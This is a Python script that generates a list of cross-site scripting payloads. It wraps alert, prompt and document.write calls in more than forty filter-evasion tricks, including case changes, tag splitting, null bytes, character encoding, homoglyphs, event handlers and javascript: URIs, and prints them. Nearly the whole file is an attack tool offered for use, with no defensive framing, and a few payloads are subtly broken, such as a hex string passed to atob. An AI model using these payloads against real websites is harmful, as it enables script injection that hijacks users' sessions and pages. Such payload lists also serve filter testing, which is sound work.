def activate():
    base_payload = [
        "alert('HACKED')",
        "document.write('HACKED')",
        "prompt('HACKED')"
    ]

    obfuscations = [
    # Basic tag variations
    lambda x: f"<script>{x}</script>",
    lambda x: f"<img src=x onerror={x}>",
    lambda x: f"<svg onload={x}>",
    lambda x: f"<body onload={x}>",
    lambda x: f"<iframe src='javascript:{x}'>",
    
    # Case variation obfuscation
    lambda x: f"<ScRiPt>{x}</ScRiPt>",
    lambda x: f"<SCRIPT>{x.upper()}</SCRIPT>",
    lambda x: f"<sCrIpT>{x}</sCrIpT>",
    
    # Tag splitting techniques
    lambda x: f"<scr<script>ipt>{x}</scr</script>ipt>",
    lambda x: f"<scri<script>pt>{x}</scri</script>pt>",
    lambda x: f"<scr<!---->ipt>{x}</scr<!---->ipt>",
    
    # Null byte and special character evasion
    lambda x: f"<scr\\x00ipt>{x}</scr\\x00ipt>",
    lambda x: f"<scr%00ipt>{x}</scr%00ipt>",
    lambda x: f"<scr\u0000ipt>{x}</scr\u0000ipt>",
    
    # Whitespace evasion
    lambda x: f"<scr    ipt>{x}</scr    ipt>",
    lambda x: f"<scr\nipt>{x}</scr\nipt>",
    lambda x: f"<scr\ript>{x}</scr\ript>",
    
    # HTML entity encoding
    lambda x: f"<script>&#97;&#108;&#101;&#114;&#116;&#40;&#39;{x[7:-2]}&#39;&#41;</script>",
    lambda x: f"<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>",
    
    # JavaScript encoding techniques
    lambda x: f"<script>eval(String.fromCharCode({','.join(str(ord(c)) for c in x)}))</script>",
    lambda x: f"<script>eval(atob('{x.encode('utf-8').hex()}'))</script>",
    lambda x: f"<script>window['eval']('{x}')</script>",
    
    # String concatenation
    lambda x: f"<script>{x.replace('alert', 'al' + 'ert')}</script>",
    lambda x: f"<script>{x.replace('(', '%28').replace(')', '%29')}</script>",
    
    # Unicode homoglyph substitution
    lambda x: f"<script>{x.replace('a', 'а').replace('e', 'е')}</script>",  # Cyrillic
    lambda x: f"<ѕcript>{x}</ѕcript>",  # Cyrillic 'ѕ'
    lambda x: f"<script>{x.replace('(', '﹙').replace(')', '﹚')}</script>",  # Full-width
    
    # Event handler variations
    lambda x: f"<img src=x onerror=\"{x}\">",
    lambda x: f"<img src=x onerror='{x}'>",
    lambda x: f"<img src=x onerror=`{x}`>",
    lambda x: f"<input onfocus={x} autofocus>",
    
    # Protocol obfuscation
    lambda x: f"<a href='java\\tscript:{x}'>click</a>",
    lambda x: f"<a href='java\\nscript:{x}'>click</a>",
    lambda x: f"<a href='javascript:{x}'>click</a>",
    
    # SVG-based payloads
    lambda x: f"<svg><script>{x}</script></svg>",
    lambda x: f"<svg><g onload={x}></g></svg>",
    lambda x: f"<svg><a xlink:href='javascript:{x}'>click</a></svg>",
    
    # Data protocol obfuscation
    lambda x: f"<iframe src='data:text/html;base64,PHNjcmlwdD57eH19PC9zY3JpcHQ+'.replace('{{x}}', '{x}')></iframe>",
    
    # Comment evasion
    lambda x: f"<script><!--\n{x}\n//--></script>",
    lambda x: f"<!--<script>-->{x}<!--</script>-->",
    
    # Template literal obfuscation
    lambda x: f"<script>eval(`{x}`)</script>",
    lambda x: f"<script>{{{x}}}</script>",
    
    # Double encoding
    lambda x: f"<script>eval(unescape('%61%6c%65%72%74%28%31%29'))</script>",
    
    # With statement obfuscation
    lambda x: f"<script>with(document)write('{x}')</script>",
    ]

    payloads = []
    for base in base_payload:
        for obfuscate in obfuscations:
            payloads.append(obfuscate(base))
    return payloads

if __name__ == "__main__":
    payloads = activate()
    for i,payload in enumerate(payloads):
        print(f"{i}.{payload}")
